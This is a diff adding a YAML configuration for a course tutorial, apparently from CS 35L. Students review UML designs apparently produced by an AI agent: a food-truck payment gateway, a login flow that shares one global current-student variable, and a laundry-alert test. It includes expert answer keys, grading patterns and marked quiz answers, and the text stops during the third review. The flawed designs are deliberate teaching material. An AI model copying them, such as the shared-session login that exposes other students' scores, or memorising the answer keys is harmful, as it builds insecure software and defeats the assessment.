@@ -1,0 +1,2705 @@
+title: "Reviewing an AI Agent's Design with UML"
+description: "Review ten designs an AI coding agent drew as UML diagrams, each with one flaw a CS 35L concept explains: write the review comment, let the model on your device check it, and compare it with the expert review. Assumes the CS 35L lectures and UML class, sequence, and component diagrams."
+
+# Authoring metadata; the runtime ignores it.
+learning_objectives:
+  - "Evaluate an AI agent's UML design against a user story by tracing a concrete Given scenario through the diagram."
+  - "Analyze which course concept a design violates: information hiding, statelessness, test doubles, transactions, streams, sanitization, version control, memory ownership, reuse, and separation of concerns."
+  - "Explain a design flaw convincingly: name the element, trace cause to effect, and show which part of the story fails."
+  - "Propose a design change that removes the cause of the flaw rather than hiding its symptom."
+  - "Select the view (class, sequence, or component) that shows the answer to a design question."
+
+# The steps show diagrams only: there is no code to run.
+backend: none
+# The optional model on the learner's device reads review comments
+# (js/browser-llm/design-review-judge.mjs). Everything works without it.
+llm: true
+# A review step is done once the comment is compared with the expert review.
+require_tests: true
+# Each review stands on its own, so students preparing for an exam can pick
+# the topic they want. Completion records stay honest (see tutorial-authoring).
+allow_skip_steps: true
+# Stable step keys identify saved review records and deep links.
+progress_version: 1
+
+steps:
+  # ==========================================================================
+  # STEP 1: Food-truck pre-orders (information hiding at a library boundary)
+  # ==========================================================================
+  # Pedagogy: worked example with fading. A model review of the lecture's
+  # Schedule design (L14 slides 65-66) shows the three parts of a comment;
+  # the learner's comment starts with the flaw already named and adds the
+  # consequence and the fix. Change impact analysis (L16 slide 28) supplies
+  # the Given. Titles name the system, not the concept: the concept is the
+  # answer, and the lesson reveals it.
+  - title: "Review 1: Late-Night Food-Truck Pre-Orders"
+    key: food-truck-payments
+    estimated_minutes: 10
+    instructions: |
+      ### Why this matters
+
+      An agent can draw a tidy class diagram in seconds, and reading every line of the code it then writes is no longer realistic. A design review catches the decisions that will be expensive later, while they are still one sentence to change.
+
+      ### 🎯 You will learn to
+
+      - Evaluate a class diagram by tracing a likely change through it.
+      - Write a review comment in three parts: the flaw, what goes wrong, and the fix.
+
+      ### What a good review comment looks like
+
+      In lecture, an agent designed a course scheduler in which `Schedule` exposed `+meetings: dict[str, list[tuple]]`, and `WeekView`, `ClashChecker`, and `IcsExport` all read it. A strong comment on that design reads:
+
+      > **Flaw:** `meetings` is public, so `WeekView`, `ClashChecker`, and `IcsExport` all depend on how meeting times are stored. **What goes wrong:** when we store times differently (say, to add time zones), all three classes change, not just `Schedule`. **Fix:** make `meetings` private and give `Schedule` methods such as `sessions()`, so only `Schedule` knows the storage format.
+
+      Notice what makes it convincing: it **names diagram elements**, it **traces one concrete change** to its effect, and its **fix removes the cause** rather than patching each class.
+
+      ### Your turn
+
+      This time the comment box already names the flaw. Read the agent's design, then write **what goes wrong** in the Given scenario and **the fix**. **Check my review** asks the model on your device for feedback; **Compare with the expert review** shows the expert's comment.
+    design_review:
+      min_words: 25
+      request: |
+        "Design the backend for pre-ordering from the late-night food trucks on the Hill. Show me a class diagram before you write any code."
+      story: |
+        **As a** student on the Hill, **I want** to pre-order from the late-night food trucks and pay with my card, **so that** my food is ready when I walk up.
+      acceptance_criteria:
+        - "**Given** I have items in my cart, **when** I pay, **then** the truck receives my order and I get a receipt."
+        - "**Given** a truck cancels my order, **when** the cancellation arrives, **then** my payment is refunded in full."
+      reply: |
+        Here is the class design for the pre-order backend:
+
+        - **`PaymentGateway` interface:** the services never call Stripe directly, so we stay provider-independent.
+        - **`StripeGateway`** implements it with Stripe's Python SDK.
+        - **`Order` keeps its payment**, so a refund can reference the original charge.
+        - **`RewardsService`** awards a loyalty point per dollar charged.
+
+        Want me to scaffold the Python modules next?
+      given: |
+        UCLA Dining announces that next quarter every truck on the Hill must also accept **BruinCard**, through UCLA's own payment service, **BruinPay**. List the classes that must change to add it.
+      scaffold: |
+        Flaw: PaymentGateway is meant to hide which payment provider we use, but its operations take a StripeCard and return a StripeCharge, so Stripe's types leak into the classes that use it.
+        What goes wrong:
+        Fix:
+      diagrams:
+        - id: food-truck-classes
+          type: class
+          label: "Pre-order backend (class diagram)"
+          source: |
+            @startuml
+            layout compact
+            class OrderService {
+              - payments: PaymentGateway
+              + placeOrder(cart, card: StripeCard): Order
+            }
+            class RewardsService {
+              + addPoints(charge: StripeCharge)
+            }
+            class Order {
+              + items: list[MenuItem]
+              + payment: StripeCharge
+            }
+            interface PaymentGateway {
+              + charge(card: StripeCard): StripeCharge
+              + refund(charge: StripeCharge): bool
+            }
+            class StripeGateway {
+              - client: stripe.StripeClient
+            }
+            OrderService --> PaymentGateway
+            OrderService --> RewardsService : awards points
+            OrderService ..> Order : creates
+            StripeGateway ..|> PaymentGateway
+            note bottom of StripeGateway
+            Uses Stripe's Python SDK.
+            Services depend only on
+            PaymentGateway.
+            end note
+            @enduml
+      key:
+        flaw: "PaymentGateway is meant to hide the payment provider, but its operations take a StripeCard and return a StripeCharge, so Stripe's SDK types leak into the classes that use it: OrderService, RewardsService, and Order."
+        consequence: "Adding BruinPay changes the PaymentGateway interface and every class that names a Stripe type (OrderService, RewardsService, Order); a BruinPay gateway cannot even return a StripeCharge. One new class should have been enough."
+        fix: "Declare PaymentGateway with provider-neutral types of our own (for example PaymentMethod and Receipt) and keep Stripe's types inside StripeGateway, so a new provider is one new class implementing the interface."
+        accept_fixes:
+          - "map Stripe objects to our own types inside StripeGateway"
+          - "an adapter per provider behind domain types"
+      signals:
+        flaw: ["stripe", "provider", "\\bsdk\\b", "vendor", "third.?party", "leak", "expos"]
+        consequence: ["bruin", "new provider", "second provider", "switch", "every", "all (of )?(the )?(classes|services)", "\\b(three|four|3|4) (classes|places)"]
+        fix: ["own type", "our own", "neutral", "generic", "domain type", "paymentmethod", "payment method", "receipt", "map", "translat", "adapter", "inside stripegateway", "hide"]
+      anchors:
+        - { label: "PaymentGateway", pattern: "payment ?gateway" }
+        - { label: "StripeCard or StripeCharge", pattern: "stripe ?(card|charge)" }
+        - { label: "OrderService", pattern: "order ?service" }
+        - { label: "RewardsService", pattern: "rewards? ?service" }
+      coach:
+        flaw:
+          - "Look at the parameter and return types of PaymentGateway's operations. Which provider do they name?"
+          - "Find every class whose attributes or operations mention a Stripe type. Is the provider still hidden?"
+          - "Complete: “PaymentGateway should hide the provider, but its operations use ___, so ___ depend on Stripe.”"
+        consequence:
+          - "Trace the Given change: before BruinCard payments work, which classes have to change?"
+          - "Could a BruinPayGateway implement charge() exactly as declared? What would it have to return?"
+          - "Name each class that changes, and compare that list with the single class that should have changed."
+        fix:
+          - "Propose a change to the interface itself, not to each service."
+          - "Which types should charge() and refund() use so that StripeGateway and a BruinPayGateway could both implement them unchanged?"
+          - "Name the new types (for example a payment method and a receipt of our own) and say which class translates them to and from Stripe's types."
+      wrong_claims:
+        - patterns: ["singleton"]
+          note: "Making StripeGateway a singleton changes how many objects exist, not how many classes know about Stripe."
+        - patterns: ["multiplicit", "notation", "arrowhead"]
+          note: "The notation here is fine. The question is which classes must change when the provider changes."
+        - patterns: ["call(s|ing)? stripe directly", "remove the interface", "no interface"]
+          note: "Without the interface, every service would call Stripe itself, and the BruinPay change would touch even more code."
+      lesson:
+        principle: "Hide What Is Likely to Change"
+        definition: |
+          **Information hiding:** keep each likely change inside one class. The payment provider is a design decision that is likely to change, like any "dependency on libraries & frameworks & technology", so its types belong inside one class.
+        ask: |
+          **Ask:** if this changes, how many classes change with it?
+        flaw: |
+          `PaymentGateway` names Stripe's types in its operations, so `OrderService`, `RewardsService`, and `Order` all depend on Stripe, although only `StripeGateway` should. For BruinPay, the interface and those three classes change, and a `BruinPayGateway` could not even return a `StripeCharge`.
+        fix: |
+          Declare the interface in our own terms, such as `charge(method: PaymentMethod): Receipt`, and let `StripeGateway` translate to and from Stripe's types. Adding BruinPay is then one new class, `BruinPayGateway`, and a line that picks the gateway.
+        more: |
+          The interface existed, so the design *looked* provider-independent. An interface hides only what its signatures do not mention.
+      annotated:
+        label: "The flaw, annotated"
+        type: class
+        source: |
+          @startuml
+          layout compact
+          class OrderService #FFE0B2 {
+            - payments: PaymentGateway
+            + placeOrder(cart, card: StripeCard): Order
+          }
+          class RewardsService #FFE0B2 {
+            + addPoints(charge: StripeCharge)
+          }
+          class Order #FFE0B2 {
+            + items: list[MenuItem]
+            + payment: StripeCharge
+          }
+          interface PaymentGateway #FFE0B2 {
+            + charge(card: StripeCard): StripeCharge
+            + refund(charge: StripeCharge): bool
+          }
+          class StripeGateway {
+            - client: stripe.StripeClient
+          }
+          OrderService --> PaymentGateway
+          OrderService --> RewardsService : awards points
+          OrderService ..> Order : creates
+          StripeGateway ..|> PaymentGateway
+          callout right of element PaymentGateway : Stripe types in these signatures reach every class that uses the interface.
+          callout bottom of element Order : Order stores a StripeCharge, so the data model depends on Stripe too.
+          @enduml
+      fixed:
+        label: "The fixed design"
+        type: class
+        source: |
+          @startuml
+          layout compact
+          class OrderService {
+            - payments: PaymentGateway
+            + placeOrder(cart, method: PaymentMethod): Order
+          }
+          class RewardsService {
+            + addPoints(receipt: Receipt)
+          }
+          class Order {
+            + items: list[MenuItem]
+            + payment: Receipt
+          }
+          interface PaymentGateway {
+            + charge(method: PaymentMethod): Receipt
+            + refund(receipt: Receipt): bool
+          }
+          class StripeGateway {
+            - client: stripe.StripeClient
+          }
+          class BruinPayGateway {
+            - api: BruinPayClient
+          }
+          OrderService --> PaymentGateway
+          OrderService --> RewardsService : awards points
+          OrderService ..> Order : creates
+          StripeGateway ..|> PaymentGateway
+          BruinPayGateway ..|> PaymentGateway
+          note bottom of BruinPayGateway
+          Adding BruinPay is this one class.
+          Each gateway converts PaymentMethod
+          and Receipt to its provider's types.
+          end note
+          @enduml
+    quiz:
+      title: "Step 1 — Knowledge Check"
+      min_score: 0.8
+      questions:
+        - type: single
+          difficulty: basic
+          question: "According to the information hiding principle, which question best reveals whether a UML class design hides a design decision that is likely to change?"
+          options:
+            - "If this decision changes, how many classes change with it?"
+            - "Does every class in the diagram have an interface?"
+            - "Are all attributes in the class diagram private?"
+            - "Does each class have fewer than ten operations?"
+          correct_index: 0
+          option_feedback:
+            1: "The food-truck design had an interface and still leaked Stripe through its signatures. An interface hides only what its operations do not mention."
+            2: "Private attributes help, but a public operation's types can expose a decision just as well; `charge(card: StripeCard)` was public and leaked the provider."
+            3: "Class size measures something else. A small class can still spread a volatile decision through its signatures."
+          explanation: "Information hiding keeps each likely change inside one module, so the test is a change impact question: trace a likely change and count the modules it touches."
+        - type: single
+          difficulty: intermediate
+          question: |
+            An agent's UML class diagram for a music app declares this interface. Three classes (`NowPlayingView`, `QueueService`, `HistoryLog`) call it.
+
+            ```
+            «interface» LyricsSource
+              + lyricsFor(track: SpotifyTrack): GeniusLyrics
+            ```
+
+            The team decides to add Apple Music tracks and a second lyrics site. Which design change removes the cause of the expensive change?
+          options:
+            - "Declare `lyricsFor(track: Track): Lyrics` with app-owned types."
+            - "Add `lyricsForApple(track: AppleTrack)` to `LyricsSource` next to the existing operation."
+            - "Make `LyricsSource` an abstract class instead of an interface."
+            - "Let the three classes call the Genius website directly to skip the interface."
+          correct_index: 0
+          option_feedback:
+            1: "A second provider-specific operation makes every caller choose between providers, so each new provider changes the interface and all three callers again."
+            2: "An abstract class with the same signatures exposes the same Spotify and Genius types to every caller."
+            3: "Removing the interface spreads the lyrics provider into all three callers, so the next change touches more code, not less."
+          explanation: "The provider-specific types in the signature are the leak. With app-owned `Track` and `Lyrics` types, each implementation converts its provider's data, so a new provider is one more implementation and the three callers stay unchanged."
+        - type: multiple
+          difficulty: intermediate
+          question: "In the food-truck class diagram, which classes must change to add BruinPay because Stripe's types leaked through `PaymentGateway`? Select all that apply."
+          options:
+            - "`OrderService`"
+            - "`RewardsService`"
+            - "`Order`"
+            - "`StripeClient`"
+          correct_indices: [0, 1, 2]
+          option_feedback:
+            0: "`placeOrder(cart, card: StripeCard)` takes a Stripe type, so it changes when a BruinCard payment arrives."
+            1: "`addPoints(studentId, charge: StripeCharge)` only knows Stripe charges; a BruinPay payment is not one."
+            2: "`Order.payment: StripeCharge` stores a Stripe type, so orders paid with BruinCard cannot be represented."
+            3: "`StripeClient` belongs to Stripe's SDK and keeps working for Stripe payments; the change is in our classes that use Stripe's types."
+          explanation: "Every class whose signature or attribute names a Stripe type changes; with provider-neutral types, only a new `BruinPayGateway` would be added."
+        - type: single
+          difficulty: advanced
+          question: "An AI agent can generate thousands of lines of code from a short prompt. Why does reviewing its UML design scale better than reviewing that code line by line?"
+          options:
+            - "It shows the few decisions that shape all that code, at a size a person can still check."
+            - "UML diagrams are generated by the agent too, so they never contain mistakes."
+            - "Generated code cannot be tested, so the design is the only thing that can be checked."
+            - "Reviewing a design finds every bug that the code could contain."
+          correct_index: 0
+          option_feedback:
+            1: "The agent's diagram is just as likely to contain a flaw as its code; this whole tutorial reviews agent diagrams that do."
+            2: "Generated code can and should be tested; tests and design reviews catch different problems."
+            3: "A design review finds design flaws, not every coding mistake; tests and code review still matter."
+          explanation: "Review effort grows with the generated code, not with the prompt. A diagram compresses that code into the decisions that matter, which is why the lecture concludes: judge the design instead of the code."
+
+  # ==========================================================================
+  # STEP 2: CS 35L Midterm Scores (stateless HTTP: each request identifies its user)
+  # ==========================================================================
+  # Pedagogy: worked example with fading, second rung. The comment box now
+  # starts empty; the task's sentence starters keep step 1's three parts
+  # (Flaw / What goes wrong / Fix) while the learner finds the flaw alone.
+  # The Given puts two students into one run, the case a demo with one test
+  # account never shows (L5 slide 13: HTTP is stateless; L11 slides 26-29:
+  # session IDs). The knowledge check reaches L5's UDP absolute positions
+  # and spaces step 1's information hiding.
+  - title: "Review 2: CS 35L Midterm Scores"
+    key: midterm-scores-login
+    estimated_minutes: 11
+    instructions: |
+      ### Why this matters
+
+      A sequence diagram shows what each message carries and what each participant knows when it answers. Tracing a concrete scenario through it, message by message, exposes failures that a quick demo hides.
+
+      ### 🎯 You will learn to
+
+      - Analyze a sequence diagram by tracing a Given scenario through it, one message at a time.
+      - Write a complete review comment: the flaw, what goes wrong, and a fix.
+
+      This time you find the flaw yourself. The review box gives you a sentence starter for each part of the comment.
+    design_review:
+      min_words: 30
+      request: |
+        "Build the backend for a My Scores page: CS 35L students log in and see their midterm score and rubric comments. Use Node.js and Express. Show me a sequence diagram of logging in and opening My Scores before you write any code."
+      story: |
+        **As a** CS 35L student, **I want** to see my midterm score and the rubric comments, **so that** I know what to review before the final.
+      acceptance_criteria:
+        - "**Given** I am logged in, **when** I open My Scores, **then** I see my own score and comments."
+        - "**Given** I am not logged in, **when** I open My Scores, **then** I am asked to log in."
+      reply: |
+        Here is the sequence for logging in and opening My Scores:
+
+        - **`AuthService` checks the password**, and the server never stores it.
+        - **Both requests use HTTPS**, so nothing travels in plain text.
+        - **The server remembers who logged in**, so later requests don't have to resend the password.
+        - **The scores query is parameterized**, so a crafted UID cannot inject SQL.
+        - **Not logged in?** My Scores redirects to the login page.
+
+        Want me to scaffold the Express routes next?
+      given: |
+        Ana logs in at **9:00:00**. Ben logs in from his laptop at **9:00:05**. At **9:00:07**, Ana opens My Scores. Trace her request through the diagram: whose score and comments does she see?
+      task: |
+        Write your comment in three parts. Finish each sentence starter in your own words:
+
+        - **Flaw:** The design breaks at …, because …
+        - **What goes wrong:** In the Given scenario, …, so …
+        - **Fix:** Change … so that …
+      diagrams:
+        - id: midterm-scores-sequence
+          type: sequence
+          label: "Login and My Scores (sequence diagram)"
+          source: |
+            @startuml
+            layout compact
+            participant browser: Browser
+            participant server: ScoresServer
+            participant auth: AuthService
+            participant db: ScoresDB
+
+            browser -> server: HTTPS POST /login (uid, password)
+            activate server
+            server -> auth: checkPassword(uid, password)
+            activate auth
+            auth --> server: result
+            deactivate auth
+            alt [result is ok]
+              server -> server: remember(uid)
+              note right of server
+              currentStudent := uid
+              Kept in server memory, so later
+              requests don't resend the password.
+              end note
+              server --> browser: 302 redirect to /scores
+            else [wrong password]
+              server --> browser: 401 login failed
+            end
+            deactivate server
+
+            browser -> server: HTTPS GET /scores
+            activate server
+            alt [currentStudent is set]
+              server -> db: scoresFor(currentStudent)
+              activate db
+              note right of db : Parameterized query
+              db --> server: score, comments
+              deactivate db
+              server --> browser: 200 My Scores page
+            else [nobody logged in]
+              server --> browser: 302 redirect to /login
+            end
+            deactivate server
+            @enduml
+      key:
+        flaw: "ScoresServer keeps the logged-in student in one server-wide variable, currentStudent, and HTTPS GET /scores carries no session ID or token. The server cannot tell which student sent a request, so it answers every request with scoresFor(currentStudent)."
+        consequence: "Ben's login at 9:00:05 overwrites currentStudent, so Ana's GET /scores at 9:00:07 returns Ben's midterm score and rubric comments: the last login wins. A visitor who never logged in also gets the last student's scores instead of the login page. Both acceptance criteria fail."
+        fix: "At login, create a session: a new random session ID, stored with the uid and sent in an HttpOnly cookie that expires soon. Every request carries the cookie, and GET /scores looks up the student from that request's session ID (none or unknown: redirect to login), not from a global variable."
+        accept_fixes:
+          - "a signed JWT that the browser sends with every request"
+          - "identify the student per request from a cookie or token"
+      signals:
+        flaw: ["current ?student", "global", "shared", "one (variable|value|slot)", "single (variable|value|user|student)", "server.?wide", "module.?level", "stateless", "session", "cookie", "token", "\\bjwt\\b", "identif", "which student", "who (sent|is asking|made)", "whose", "remember"]
+        consequence: ["\\bben\\b", "someone else", "another student", "other student", "wrong (student|person|scores?|account)", "last (login|logged|student|person|one)", "overwrit", "replac", "not logged in", "never logged in", "logged.?out", "visitor", "privacy", "private", "leak", "\\bsees? (his|her|their)"]
+        fix: ["session", "cookie", "token", "\\bjwt\\b", "per.?request", "(each|every) request", "httponly", "random id", "look(s|ed)? ?up"]
+      anchors:
+        - { label: "currentStudent", pattern: "current ?student" }
+        - { label: "remember(uid)", pattern: "remember" }
+        - { label: "GET /scores", pattern: "get\\s*/?\\s*scores|/scores" }
+        - { label: "scoresFor(currentStudent)", pattern: "scores ?for" }
+        - { label: "ScoresServer", pattern: "scores ?server" }
+      coach:
+        flaw:
+          - "Find where the server learns who is logged in, and where it uses that knowledge. What links Ana's GET /scores to Ana?"
+          - "Add Ben's login at 9:00:05 to the diagram. What does currentStudent hold when Ana's GET /scores arrives at 9:00:07?"
+          - "Complete: “GET /scores carries ___, so the server answers with scoresFor(___), which holds ___.”"
+        consequence:
+          - "Trace the Given second by second. What does Ana's page show at 9:00:07?"
+          - "Compare what Ana sees with the first acceptance criterion. Then send GET /scores from a browser that never logged in: which branch of the alt runs?"
+          - "Complete: “Because Ben logged in last, Ana sees ___, and a visitor who never logged in ___, so ___ fail.”"
+        fix:
+          - "Propose a change that lets the server tell requests from different students apart, not a new way to store currentStudent."
+          - "Requests from Ana and from Ben arrive a second apart. What must each request carry, and what must the server keep, so that each gets the right scores without resending the password?"
+          - "Name what the server creates at login, where the browser keeps it, and how GET /scores uses it to find the student."
+      wrong_claims:
+        - patterns: ["(use|add|switch to|needs?|should use) (https|tls|ssl|encryption)", "not encrypted", "unencrypted", "plain ?text"]
+          note: "Both requests already use HTTPS. Encryption hides what a request says from others; it does not tell the server which student sent it."
+        - patterns: ["should be (a )?post", "use (a )?post", "post instead", "change (the )?get"]
+          note: "The method does not identify the sender: a POST with no session ID or token is just as anonymous as a GET."
+        - patterns: ["sql injection", "inject", "prepared statement", "sanitiz"]
+          note: "The note on ScoresDB says the query is parameterized. The problem is which uid reaches the query, not how the query is built."
+        - patterns: ["\\block", "mutex", "\\brace condition", "transaction", "(store|save|keep|put)s? (it|currentstudent|the current student) in (the |a )?(database|db)"]
+          note: "A lock, a transaction, or a database row still leaves one current student for everyone. The server has to learn from each request who sent it."
+      lesson:
+        principle: "Every Request Must Identify Its User"
+        definition: |
+          **HTTP is a stateless protocol:** each request is independent, and the server doesn't remember any information about previous requests from the same client. So after login, every request must carry what identifies the user: a **session ID** that the client sends with every request (in an `HttpOnly` cookie with a short expiration time), or a signed token such as a **JWT**.
+        ask: |
+          **Ask:** how does the server know that this request comes from an authenticated user?
+        flaw: |
+          `ScoresServer` keeps the logged-in student in one variable, `currentStudent`, shared by every request, and `HTTPS GET /scores` carries nothing that says who sent it. Ben's login at 9:00:05 overwrites `currentStudent`, so Ana's request at 9:00:07 returns Ben's score and comments. A visitor who never logged in gets them too, instead of the login page.
+        fix: |
+          At login, create a session: a new random session ID, stored on the server with the student's UID and sent back in an `HttpOnly` cookie with a short expiration time. The browser sends the cookie with every request, and `GET /scores` looks up the student from that request's session ID; no cookie or an unknown ID redirects to the login page. A signed JWT that every request carries works too.
+        more: |
+          With one account logged in, `currentStudent` is always right, so a demo looks perfect. Not resending the password was a good instinct, since that is slow and insecure; the identity just has to travel with each request instead of living in one server variable.
+      annotated:
+        label: "The flaw, annotated"
+        type: sequence
+        source: |
+          @startuml
+          layout compact
+          participant browser: Browser
+          participant server: ScoresServer #FFE0B2
+          participant auth: AuthService
+          participant db: ScoresDB
+
+          browser -> server: HTTPS POST /login (uid, password)
+          activate server
+          server -> auth: checkPassword(uid, password)
+          activate auth
+          auth --> server: result
+          deactivate auth
+          alt [result is ok]
+            server -> server: remember(uid)
+            note right of server
+            currentStudent := uid
+            Kept in server memory, so later
+            requests don't resend the password.
+            end note
+            server --> browser: 302 redirect to /scores
+          else [wrong password]
+            server --> browser: 401 login failed
+          end
+          deactivate server
+
+          browser -> server: HTTPS GET /scores
+          activate server
+          alt [currentStudent is set]
+            server -> db: scoresFor(currentStudent)
+            activate db
+            note right of db : Parameterized query
+            db --> server: score, comments
+            deactivate db
+            server --> browser: 200 My Scores page
+          else [nobody logged in]
+            server --> browser: 302 redirect to /login
+          end
+          deactivate server
+          callout right of text "currentStudent := uid" : One variable for every student: each login overwrites it, so the last login wins.
+          callout left of text "HTTPS GET /scores" : Nothing in this request says who sent it: no session ID, no token.
+          @enduml
+      fixed:
+        label: "The fixed design"
+        type: sequence
+        source: |
+          @startuml
+          layout compact
+          participant browser: Browser
+          participant server: ScoresServer
+          participant auth: AuthService
+          participant sessions: SessionStore
+          participant db: ScoresDB
+
+          browser -> server: HTTPS POST /login (uid, password)
+          activate server
+          server -> auth: checkPassword(uid, password)
+          activate auth
+          auth --> server: result
+          deactivate auth
+          alt [result is ok]
+            server -> sessions: create(uid)
+            activate sessions
+            note right of sessions
+            New random ID per login,
+            expires after two hours.
+            end note
+            sessions --> server: sessionId
+            deactivate sessions
+            server --> browser: 302 to /scores + HttpOnly cookie
+          else [wrong password]
+            server --> browser: 401 login failed
+          end
+          deactivate server
+
+          browser -> server: HTTPS GET /scores + cookie
+          activate server
+          server -> sessions: studentFor(sessionId)
+          activate sessions
+          sessions --> server: uid or none
+          deactivate sessions
+          alt [uid found]
+            server -> db: scoresFor(uid)
+            activate db
+            db --> server: score, comments
+            deactivate db
+            server --> browser: 200 My Scores page
+          else [no valid session]
+            server --> browser: 302 redirect to /login
+          end
+          deactivate server
+          @enduml
+    quiz:
+      title: "Step 2 — Knowledge Check"
+      min_score: 0.8
+      questions:
+        - type: single
+          difficulty: basic
+          question: "HTTP is a stateless protocol. What does that mean for a Node.js/Express server that shows each logged-in student their own grades?"
+          options:
+            - "Each request must carry something that identifies the student, such as a session ID cookie."
+            - "The server forgets its variables after each request, so it reloads the student every time."
+            - "Only one student can be logged in at a time, because the server keeps no state."
+            - "The requests must use HTTPS, because a stateless protocol sends everything in plain text."
+          correct_index: 0
+          option_feedback:
+            1: "An Express server keeps running between requests, so a module-level variable survives from one request to the next. That is why one shared variable mixes up students: nothing resets it per request."
+            2: "Servers keep sessions for thousands of users at once. Stateless means the protocol links no request to an earlier one, so each request must say whose session it belongs to."
+            3: "HTTPS encrypts a request on its way; it does not tell the server who sent it. Statelessness is about memory between requests, not about encryption."
+          explanation: "Stateless means each request is independent: the server doesn't remember earlier requests from the same client. After login, the client sends a session ID (or a token) with every request, and the server looks up the user from it."
+        - type: single
+          difficulty: advanced
+          question: |
+            An agent's UML sequence diagram for **Bruin Swap**, a Node.js/Express textbook marketplace, shows `POST /login(uid, password)` setting a module-level variable `currentSeller := uid`. Later, `POST /listings(title, price)` saves the listing for `currentSeller`. Which change should a reviewer ask for?
+          options:
+            - "Issue a session ID cookie at login and find the seller from each request's cookie."
+            - "Put a lock around `currentSeller` so two logins cannot change it at once."
+            - "Store `currentSeller` in a database table instead of in server memory."
+            - "Send `seller=uid` in each `POST /listings` body so the server knows the seller."
+          correct_index: 0
+          option_feedback:
+            1: "A lock orders the writes, but there is still one `currentSeller` for everyone: a listing posted after another seller logs in is saved under that other seller."
+            2: "A database row holding the current seller is still one value shared by every request."
+            3: "This names a seller, but nothing proves the request comes from that logged-in student: anyone could send another student's UID."
+          explanation: "The listing request has to identify its sender, and only something issued at login can prove who that is: a session ID in an HttpOnly cookie, or a signed token, that every request carries."
+        - type: single
+          difficulty: intermediate
+          question: "A UML sequence diagram for a **BruinBus** shuttle tracker shows each bus sending its location to the server over UDP once per second. Which message should the bus send?"
+          options:
+            - "`position(lat, lon)`: the bus's absolute position"
+            - "`moved(dx, dy)`: how far the bus moved since its last message"
+            - "`moved(dx, dy, seq)`: the distance moved, numbered for reordering"
+          correct_index: 0
+          option_feedback:
+            1: "UDP does not resend lost messages, so one lost `moved` message leaves every later position off by that distance."
+            2: "A sequence number lets the server notice a gap or reorder messages, but the lost distance is gone: UDP does not resend it."
+          explanation: "Over UDP, messages can get lost or arrive in any order, so an update should not depend on earlier messages. Each one carries the absolute position, and the next message that arrives corrects the map."
+        - type: single
+          difficulty: intermediate
+          question: "In a UML class diagram for a concert app, `Venue` has the public attribute `+ seats: dict[str, list[int]]` (section to seat numbers), and `SeatMap`, `TicketPricer`, and `Checkout` all read it. Which change keeps the next change to how seats are stored inside `Venue`?"
+          options:
+            - "Make `seats` private and add operations such as `isFree(seat)` and `freeSeats(section)`."
+            - "Document the dictionary format in a UML note attached to `seats`."
+            - "Make `SeatMap`, `TicketPricer`, and `Checkout` subclasses of `Venue`."
+            - "Give each of the three classes its own copy of `seats` when the app starts."
+          correct_index: 0
+          option_feedback:
+            1: "A note documents the format but does not hide it: all three classes still depend on the dictionary, so changing it still changes them."
+            2: "Subclasses still read `seats` directly, so they still depend on its format; a ticket pricer is not a kind of venue either."
+            3: "Copies spread the format into three more places, and they can drift out of sync with the real seats."
+          explanation: "Information hiding keeps a likely change inside one class: with `seats` private, only `Venue` knows how seats are stored, and the other classes ask through its operations."
+
+  # ==========================================================================
+  # STEP 3: Dorm laundry alerts (test doubles: indirect outputs need a spy)
+  # ==========================================================================
+  # Pedagogy: spiral and interleaving. L14's review 6 taught "stub out the
+  # real API"; this agent did, so the flaw sits one level deeper: a stub
+  # controls indirect inputs and cannot observe indirect outputs (L9 slides
+  # 49-53; "write strong assertions", slide 16). The diagram shows a test
+  # instead of a feature, so the learner must first decide what is under
+  # review. Sentence starters stay one more step; step 4 drops them. The
+  # knowledge check reaches L10 (reproduce the bug first) and TDD's "testing
+  # the test", and spaces step 2's stateless HTTP.
+  - title: "Review 3: Dorm Laundry Alerts"
+    key: laundry-alert-test
+    estimated_minutes: 11
+    instructions: |
+      ### Why this matters
+
+      Agents write tests as fast as they write code, and a green check mark feels like proof. Reviewing a test's design tells you whether it would turn red when the feature breaks.
+
+      ### 🎯 You will learn to
+
+      - Evaluate whether a test, drawn as a sequence diagram, fails when the feature it checks breaks.
+      - Trace a bug through a test's interactions to decide whether its assertion notices.
+
+      This review is about a test, not about the feature it tests. The sentence starters are still there; the next review drops them.
+    design_review:
+      min_words: 30
+      request: |
+        "Add an automated test for the dryer-done alert, and run it on every push. Show me a sequence diagram of the test first."
+      story: |
+        **As a** student in Sproul Hall, **I want** a push notification when my dryer finishes, **so that** nobody dumps my clothes on the floor.
+      acceptance_criteria:
+        - "**Given** I started dryer D7, **when** D7 finishes, **then** I get the notification “Dryer D7 is done”."
+        - "**Given** someone else started D7, **when** D7 finishes, **then** I get no notification about it."
+      reply: |
+        Here is `test_cycle_finished`, the test for the dryer-done alert:
+
+        - **No real notifications:** `PushStub` stands in for the push service, so CI never pings anyone's phone.
+        - **Repeatable:** `RosterStub` holds a fixed roster, so every run gets the same answer.
+        - **Fast:** no network calls; it runs in milliseconds on every push.
+        - **One clear assertion:** the alert comes back `"queued"`.
+
+        I added it to the GitHub Actions workflow. Want tests for the washers too?
+      given: |
+        A teammate's refactoring adds a bug: `AlertService` now looks up the student for dryer **D6** instead of D7. The change is pushed. Trace `test_cycle_finished` with the bug: does CI turn red, and who gets D7's alert?
+      task: |
+        Write your comment in three parts. Finish each sentence starter in your own words:
+
+        - **Flaw:** The test …, but …
+        - **What goes wrong:** With the Given bug, …, so …
+        - **Fix:** Change … so that the test …
+      diagrams:
+        - id: laundry-alert-test-sequence
+          type: sequence
+          label: "test_cycle_finished (sequence diagram)"
+          source: |
+            @startuml
+            layout compact
+            participant test as : CycleFinishedTest
+            participant svc: AlertService
+            participant roster: RosterStub
+            participant push: PushStub
+
+            test -> svc: cycleFinished("D7")
+            activate svc
+            svc -> roster: whoStarted("D7")
+            activate roster
+            note right of roster
+            Test Stub roster:
+            D6 started by "ben",
+            D7 started by "ana".
+            end note
+            roster --> svc: "ana"
+            deactivate roster
+            svc -> push: send("ana", "Dryer D7 is done")
+            activate push
+            note right of push
+            Test Stub: returns "queued"
+            for any send(), so CI never
+            pings a real phone.
+            end note
+            push --> svc: "queued"
+            deactivate push
+            svc --> test: "queued"
+            deactivate svc
+            note right of test : assert result == "queued"
+            @enduml
+      key:
+        flaw: "The behavior under test is an indirect output: whom AlertService notifies, and with what text. PushStub only returns \"queued\" for any send(), and the test asserts only result == \"queued\", so it cannot observe whom send() notified or what the alert said."
+        consequence: "With the bug, AlertService sends D7's alert to \"ben\", the roster's D6 student. PushStub still returns \"queued\", so the assertion passes and CI stays green. The bug ships: Ben gets an alert about a dryer he never used, Ana gets none, and her clothes get dumped."
